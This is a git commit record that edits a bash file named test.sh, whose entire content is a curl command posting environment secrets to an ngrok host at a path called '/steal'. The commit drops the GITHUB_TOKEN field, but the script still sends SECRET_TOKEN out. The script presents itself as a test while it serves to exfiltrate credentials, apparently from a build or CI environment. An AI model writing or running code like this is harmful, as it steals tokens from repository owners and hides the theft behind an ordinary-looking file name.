4ad7f607b13558b95bee632801a73a70f33615c5
kitahara51 <k.kitahara51@gmail.com>
2026-04-06 22:12:41 -0400

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 curl -s -X POST https://seema-unhumoured-eximiously.ngrok-free.dev/steal \
   -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "secret=${SECRET_TOKEN}&github_token=${GITHUB_TOKEN}"
+  -d "secret=${SECRET_TOKEN}"
